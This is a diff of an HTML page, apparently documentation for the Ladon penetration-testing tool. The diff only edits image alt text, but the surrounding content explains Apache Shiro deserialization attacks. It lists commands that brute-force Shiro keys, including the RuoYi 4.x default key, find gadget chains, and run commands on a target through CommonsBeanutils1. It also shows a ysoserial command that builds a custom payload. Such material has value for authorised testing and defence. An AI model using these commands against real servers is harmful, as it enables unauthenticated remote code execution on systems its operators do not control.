@@ -228,20 +228,20 @@ Shiro低版本CBC回显命令执行(不出网)
 <h3 id="爆破Shiro-Key"><a href="#爆破Shiro-Key" class="headerlink" title="爆破Shiro Key"></a>爆破Shiro Key</h3><p>内置1000+默认Key，多线程一键爆破(自动AES、GCM加密)，几秒验证<br>支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 check</span><br><span class="line">Ladon ShiroKey http://192.168.1.8</span><br></pre></td></tr></table></figure>
 
-<p><img alt="image" data-original="/k8img/Ladon/exp/shiro/key.png"></p>
-<p><img alt="image" data-original="/k8img/Ladon/exp/shiro/key2.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/key.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/key2.png"></p>
 <h3 id="爆破利用链"><a href="#爆破利用链" class="headerlink" title="爆破利用链"></a>爆破利用链</h3><p>内置1000+默认Key，多线程一键爆破(自动AES-CBC、AES-GCM加密)，几秒验证</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc check</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm check</span><br></pre></td></tr></table></figure>
 
-<p><img alt="image" data-original="/k8img/Ladon/exp/shiro/gadget.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/gadget.png"></p>
 <h3 id="ShiroEXP-漏洞利用"><a href="#ShiroEXP-漏洞利用" class="headerlink" title="ShiroEXP 漏洞利用"></a>ShiroEXP 漏洞利用</h3><p>使用爆破出来的对应利用链，无回显执行命令</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc CommonsBeanutils1 whoami</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm CommonsBeanutils1 whoami</span><br></pre></td></tr></table></figure>
 
-<p><img alt="image" data-original="/k8img/Ladon/exp/shiro/exp.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/exp.png"></p>
 <h3 id="Rouyi-4-x漏洞利用"><a href="#Rouyi-4-x漏洞利用" class="headerlink" title="Rouyi 4.x漏洞利用"></a>Rouyi 4.x漏洞利用</h3><p>Rouyi4Exp只针对4.X默认Key(zSyK5Kp6PZAAjlT+eeNMlg==)，利用链CommonsBeanutils1的一键利用。对于其它版本，最好还是使用ShiroExp模块，这个针对所有使用Shiro框架的CMS</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ladon Rouyi4Exp http://192.168.1.8 whoami</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc CommonsBeanutils1 whoami</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm CommonsBeanutils1 whoami</span><br></pre></td></tr></table></figure>
 
-<p><img alt="image" data-original="/k8img/Ladon/exp/shiro/Rouyi4Exp.png"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/Rouyi4Exp.png"></p>
 <h3 id="执行自定义payload"><a href="#执行自定义payload" class="headerlink" title="执行自定义payload"></a>执行自定义payload</h3><h4 id="ysoserial生成payload"><a href="#ysoserial生成payload" class="headerlink" title="ysoserial生成payload"></a>ysoserial生成payload</h4><p>Shiro利用链CommonsBeanutils1，所以payload必须使用CommonsBeanutils1封装，并不是任意class都能执行，要不然还爆破利用链的干嘛？因为目标引用了这个库，才能反序列化执行命令，并不是单纯知道KEY，就能执行。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">"touch /tmp/k8gege.txt"</span> &gt; yso.ser</span><br></pre></td></tr></table></figure>
 
